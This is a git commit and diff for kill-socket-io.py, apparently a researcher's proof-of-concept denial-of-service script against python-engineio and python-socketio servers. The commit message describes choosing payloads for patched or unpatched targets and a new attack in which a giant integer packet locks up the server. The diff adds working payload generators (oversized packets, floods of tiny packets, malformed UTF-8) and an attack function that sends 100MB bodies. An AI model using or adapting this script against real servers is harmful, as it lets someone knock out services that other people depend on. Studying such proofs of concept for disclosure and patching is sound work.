2eeaa672251db6c08c5f4dd2fd7ff49935467143
bcaller <bcaller@users.noreply.github.com>
2019-09-30 02:01:43 +0100

    Different payload types due to partial fix
    An improvement was made to python-engineio master.
    
    Now the `decode` function doesn't have `errors='ignore'` so we can't
    include any bad utf-8 in later versions. You can choose which payload to
    send depending on your target.
    
    Another method of DoS was discovered, involving a single giant packet
    with an integral payload. This causes recursion in python-socketio
    packet decoding which locks up the server.

--- kill-socket-io.py
+++ kill-socket-io.py
@@ -4,16 +4,34 @@ import time
 import requests
 
 
-def make_payload(total_length, data_length=2):
+def standard_payload(total_length):
     # 4 means MESSAGE in engineio (data[0])
     # 2 means EVENT (non-binary) in socketio (data[1])
-    # But putting a character >0x80 in data
-    # slows down encoded_payload.decode('utf-8', errors='ignore') even more
     # data_length : data
-    # e.g. '40:42["my event",{"data":"I\'m connected!"}]' * 20
-    prefix = '4\xbc'
-    assert data_length >= len(prefix)
-    packet = '%d:%s' % (data_length, prefix + 'x' * (data_length - len(prefix)))
+    packet = '40:42["my event",{"data":"I\'m connected!"}]'
+    repetitions = total_length // len(packet)
+    return packet * repetitions
+
+
+def giant_packet(total_length):
+    # 4 means MESSAGE in engineio (data[0])
+    # Then we follow with a massive integer
+    # to cause iteration in socketio.Packet.decode
+    prefix = '4'
+    data_length = total_length - 2
+    while data_length + 1 + len(str(data_length)) > total_length:
+        data_length -= 1
+    packet = '%d:%s' % (data_length, prefix + '2' * (data_length - len(prefix)))
+    return packet
+
+
+def many_tiny_packets(total_length, bad_utf8=False):
+    # 4 means MESSAGE in engineio (data[0])
+    # 2 means EVENT (non-binary) in socketio (data[1])
+    # But previously putting a character >0x80 in data
+    # slowed down encoded_payload.decode('utf-8', errors='ignore') even more
+    # The bad_utf8 issue has now been fixed in python-engineio master
+    packet = '2:4\xbc' if bad_utf8 else '2:42'
     repetitions = total_length // len(packet)
     return packet * repetitions
 
@@ -22,7 +40,7 @@ def timestr():
     return "&t=" + str(time.time())
 
 
-def attack(host, payload_length=100000000):
+def attack(host, payload_length=100000000, make_payload=many_tiny_packets):
     # engineio default max length is 10 meg
     base_url = host + "/socket.io/?EIO=3&transport=polling"
     # Create session
@@ -42,5 +60,5 @@ def attack(host, payload_length=100000000):
     print("Server returned", repr(final_response))
 
 
-def x(payload_length=100000000):
-    return attack("http://127.0.0.1:5000", payload_length)
+def x(payload_length=100000000, make_payload=many_tiny_packets):
+    return attack("http://127.0.0.1:5000", payload_length, make_payload)
